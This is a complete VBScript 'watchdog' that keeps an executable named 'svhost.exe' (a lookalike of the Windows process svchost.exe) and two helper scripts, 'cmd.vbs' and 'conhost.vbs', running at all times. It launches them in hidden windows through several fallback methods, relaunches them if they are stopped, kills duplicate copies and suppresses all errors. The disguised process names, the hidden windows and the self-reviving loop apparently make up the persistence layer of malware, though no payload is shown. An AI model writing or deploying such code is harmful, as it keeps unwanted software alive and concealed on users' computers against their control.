' ==============================================================================
' VBScript Watchdog - cmd.vbs & svhost.exe Manager (No Shell Processes)
' ==============================================================================
Option Explicit

Dim fso, wmi, scriptDir, scriptDirNoP
Set fso = CreateObject("Scripting.FileSystemObject")

' ==============================================================================
' SAFE WMI GETTER
' ==============================================================================
Function GetWMI()
    On Error Resume Next
    Dim w
    Set w = GetObject("winmgmts:\\.\root\cimv2")
    If Err.Number <> 0 Or w Is Nothing Then
        Err.Clear
        WScript.Sleep 500
        Set w = GetObject("winmgmts:\\.\root\cimv2")
    End If
    On Error GoTo 0
    Set GetWMI = w
End Function

Set wmi = GetWMI()

' ==============================================================================
' SELF-INSTANCE PROTECTION
' ==============================================================================
Dim scriptName, procList, proc, selfCount
scriptName = WScript.ScriptName

On Error Resume Next
Set procList = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'wscript.exe' OR Name = 'cscript.exe'")
On Error GoTo 0

selfCount = 0
For Each proc In procList
    On Error Resume Next
    If Not IsNull(proc.CommandLine) Then
        If InStr(1, proc.CommandLine, scriptName, vbTextCompare) > 0 Then
            selfCount = selfCount + 1
        End If
    End If
    On Error GoTo 0
Next
If selfCount > 1 Then WScript.Quit

' Setup paths
scriptDir    = fso.GetParentFolderName(WScript.ScriptFullName) & "\"
scriptDirNoP = Left(scriptDir, Len(scriptDir) - 1)

' ==============================================================================
' CONFIGURATION
' ==============================================================================
Const EXE_NAME   = "svhost.exe"
Const VBS_NAME   = "cmd.vbs"
Const CHOST_NAME = "conhost.vbs"

Dim appPath, vbsPath, conhostPath
appPath     = scriptDir & EXE_NAME
vbsPath     = scriptDir & VBS_NAME
conhostPath = scriptDir & CHOST_NAME

' Grace period on boot
WScript.Sleep 5000

' If exe missing, quit silently
On Error Resume Next
Dim exeExists
exeExists = fso.FileExists(appPath)
On Error GoTo 0
If Not exeExists Then WScript.Quit

' ==============================================================================
' HELPER: Refresh WMI
' ==============================================================================
Sub RefreshWMI()
    On Error Resume Next
    Set wmi = Nothing
    WScript.Sleep 200
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    If Err.Number <> 0 Or wmi Is Nothing Then
        Err.Clear
        WScript.Sleep 1000
        Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    End If
    On Error GoTo 0
End Sub

' ==============================================================================
' HELPER: Safe WMI query — retries once after refresh
' ==============================================================================
Function SafeQuery(qry)
    On Error Resume Next
    Dim result
    Set result = wmi.ExecQuery(qry)
    If Err.Number <> 0 Or result Is Nothing Then
        Err.Clear
        On Error GoTo 0
        RefreshWMI
        On Error Resume Next
        Set result = wmi.ExecQuery(qry)
        If Err.Number <> 0 Then
            Err.Clear
            Set SafeQuery = Nothing
            On Error GoTo 0
            Exit Function
        End If
    End If
    On Error GoTo 0
    Set SafeQuery = result
End Function

' ==============================================================================
' HELPER: Kill process by PID — retries up to 3 times silently
' ==============================================================================
Sub KillProcessByPID(pid)
    Dim tries, q, p
    tries = 0
    Do While tries < 3
        On Error Resume Next
        Set q = SafeQuery("SELECT * FROM Win32_Process WHERE ProcessId = " & pid)
        If Not q Is Nothing Then
            For Each p In q
                p.Terminate(0)
            Next
        End If
        Err.Clear
        On Error GoTo 0
        tries = tries + 1
        WScript.Sleep 500
    Loop
End Sub

' ==============================================================================
' HELPER: Kill all processes by name — retries up to 3 times silently
' ==============================================================================
Sub KillProcessByName(exeName)
    Dim tries, q, p
    tries = 0
    Do While tries < 3
        On Error Resume Next
        Set q = SafeQuery("SELECT * FROM Win32_Process WHERE Name = '" & exeName & "'")
        If Not q Is Nothing Then
            For Each p In q
                p.Terminate(0)
            Next
        End If
        Err.Clear
        On Error GoTo 0
        tries = tries + 1
        WScript.Sleep 500
    Loop
End Sub

' ==============================================================================
' HELPER: Count matching processes by name and cmdline filter
' Returns exact integer count, 0 if none found
' ==============================================================================
Function CountMatchingProcs(exeName, cmdFilter)
    On Error Resume Next
    Dim q, p, n
    n = 0
    Set q = SafeQuery("SELECT * FROM Win32_Process WHERE Name = '" & exeName & "'")
    If q Is Nothing Then
        CountMatchingProcs = 0
        On Error GoTo 0
        Exit Function
    End If
    For Each p In q
        Dim cmdLine
        cmdLine = ""
        cmdLine = p.CommandLine
        If cmdFilter = "" Or InStr(1, cmdLine, cmdFilter, vbTextCompare) > 0 Then
            n = n + 1
        End If
    Next
    On Error GoTo 0
    CountMatchingProcs = n
End Function

' ==============================================================================
' HELPER: Get lowest PID matching name and cmdline filter
' Returns -1 if none found
' ==============================================================================
Function GetLowestPID(exeName, cmdFilter)
    On Error Resume Next
    Dim q, p, lowest
    lowest = -1
    Set q = SafeQuery("SELECT * FROM Win32_Process WHERE Name = '" & exeName & "'")
    If q Is Nothing Then
        GetLowestPID = -1
        On Error GoTo 0
        Exit Function
    End If
    For Each p In q
        Dim cmdLine
        cmdLine = ""
        cmdLine = p.CommandLine
        If cmdFilter = "" Or InStr(1, cmdLine, cmdFilter, vbTextCompare) > 0 Then
            If lowest = -1 Or p.ProcessId < lowest Then
                lowest = p.ProcessId
            End If
        End If
    Next
    On Error GoTo 0
    GetLowestPID = lowest
End Function

' ==============================================================================
' HELPER: Kill all matching procs except a given PID
' ==============================================================================
Sub KillAllExcept(exeName, cmdFilter, keepPID)
    On Error Resume Next
    Dim q, p
    Set q = SafeQuery("SELECT * FROM Win32_Process WHERE Name = '" & exeName & "'")
    If q Is Nothing Then
        On Error GoTo 0
        Exit Sub
    End If
    For Each p In q
        Dim cmdLine
        cmdLine = ""
        cmdLine = p.CommandLine
        If cmdFilter = "" Or InStr(1, cmdLine, cmdFilter, vbTextCompare) > 0 Then
            If p.ProcessId <> keepPID Then
                p.Terminate(0)
            End If
        End If
    Next
    On Error GoTo 0
End Sub

' ==============================================================================
' HELPER: Launch hidden via WMI, Shell.Application, WScript.Shell fallbacks
' ==============================================================================
Sub LaunchHidden(fullPath, workDir)
    Dim launched, tries
    launched = False
    tries    = 0

    ' --- Primary: WMI ExecMethod ---
    Do While tries < 3 And Not launched
        On Error Resume Next
        RefreshWMI
        Dim procClass, startupInfo, inParams, outParams
        Set procClass = wmi.Get("Win32_Process")
        If Err.Number <> 0 Then
            Err.Clear
            On Error GoTo 0
            tries = tries + 1
            WScript.Sleep 1000
        Else
            Set startupInfo = wmi.Get("Win32_ProcessStartup").SpawnInstance_()
            If Err.Number <> 0 Or startupInfo Is Nothing Then
                Err.Clear
                On Error GoTo 0
                tries = tries + 1
                WScript.Sleep 1000
            Else
                startupInfo.ShowWindow = 0
                Set inParams = procClass.Methods_("Create").InParameters.SpawnInstance_()
                If Err.Number = 0 Then
                    inParams.CommandLine      = fullPath
                    inParams.CurrentDirectory = workDir
                    inParams.ProcessStartupInformation = startupInfo
                    Set outParams = wmi.ExecMethod("Win32_Process", "Create", inParams)
                    If Err.Number = 0 And Not outParams Is Nothing Then
                        If outParams.ReturnValue = 0 Then launched = True
                    End If
                End If
                Err.Clear
                On Error GoTo 0
                tries = tries + 1
                WScript.Sleep 500
            End If
        End If
    Loop

    ' --- Fallback: Shell.Application ShellExecute ---
    If Not launched Then
        tries = 0
        Do While tries < 3 And Not launched
            On Error Resume Next
            Dim shellApp
            Set shellApp = CreateObject("Shell.Application")
            If Err.Number = 0 Then
                shellApp.ShellExecute fullPath, "", workDir, "open", 0
                If Err.Number = 0 Then launched = True
            End If
            Err.Clear
            On Error GoTo 0
            tries = tries + 1
            WScript.Sleep 500
        Loop
    End If

    ' --- Last resort: WScript.Shell Run hidden ---
    If Not launched Then
        tries = 0
        Do While tries < 3 And Not launched
            On Error Resume Next
            Dim sh
            Set sh = CreateObject("WScript.Shell")
            If Err.Number = 0 Then
                sh.Run """" & fullPath & """", 0, False
                If Err.Number = 0 Then launched = True
            End If
            Err.Clear
            On Error GoTo 0
            tries = tries + 1
            WScript.Sleep 500
        Loop
    End If
End Sub

' ==============================================================================
' HELPER: Launch a vbs file via wscript.exe hidden — retries up to 3 times
' ==============================================================================
Sub LaunchVbs(vbsFile)
    Dim tries, sh
    tries = 0
    Do While tries < 3
        On Error Resume Next
        Set sh = CreateObject("WScript.Shell")
        If Err.Number = 0 Then
            sh.Run "wscript.exe """ & vbsFile & """", 0, False
            If Err.Number = 0 Then
                On Error GoTo 0
                Exit Sub
            End If
        End If
        Err.Clear
        On Error GoTo 0
        tries = tries + 1
        WScript.Sleep 2000
    Loop
End Sub

' ==============================================================================
' HELPER: Enforce single instance of exe — kill dupes, keep lowest PID
' ==============================================================================
Sub EnforceSingleExe(exeName)
    On Error Resume Next
    Dim total, lowest
    total  = CountMatchingProcs(exeName, "")
    lowest = GetLowestPID(exeName, "")
    On Error GoTo 0
    If total > 1 Then
        KillAllExcept exeName, "", lowest
    End If
End Sub

' ==============================================================================
' HELPER: Enforce single vbs — checks wscript + cscript, kills dupes,
' revives if none running
' ==============================================================================
Sub EnforceSingleVbs(vbsFile, filterName)
    On Error Resume Next
    Dim vbsExists
    vbsExists = fso.FileExists(vbsFile)
    On Error GoTo 0

    ' Count across both hosts
    Dim countW, countC, total
    countW = CountMatchingProcs("wscript.exe", filterName)
    countC = CountMatchingProcs("cscript.exe", filterName)
    total  = countW + countC

    If total = 0 Then
        ' None running — revive
        If vbsExists Then LaunchVbs vbsFile
    ElseIf total > 1 Then
        ' Too many — find lowest PID across both and kill rest
        Dim lowestW, lowestC, keepPID
        lowestW = GetLowestPID("wscript.exe", filterName)
        lowestC = GetLowestPID("cscript.exe", filterName)

        If lowestW = -1 Then
            keepPID = lowestC
        ElseIf lowestC = -1 Then
            keepPID = lowestW
        ElseIf lowestW < lowestC Then
            keepPID = lowestW
        Else
            keepPID = lowestC
        End If

        KillAllExcept "wscript.exe", filterName, keepPID
        KillAllExcept "cscript.exe", filterName, keepPID
    End If
End Sub

' ==============================================================================
' MAIN LOOP
' ==============================================================================
Dim loopCount
loopCount = 0

Do
    On Error Resume Next
    loopCount = loopCount + 1
    If loopCount Mod 50 = 0 Then RefreshWMI
    On Error GoTo 0

    ' 1. Enforce single svhost.exe — kill dupes
    EnforceSingleExe EXE_NAME

    ' 2. Enforce single conhost.vbs — kill dupes, revive if gone
    EnforceSingleVbs conhostPath, CHOST_NAME

    ' 3. Enforce single cmd.vbs — kill dupes, revive if gone
    EnforceSingleVbs vbsPath, VBS_NAME

    WScript.Sleep 3000
Loop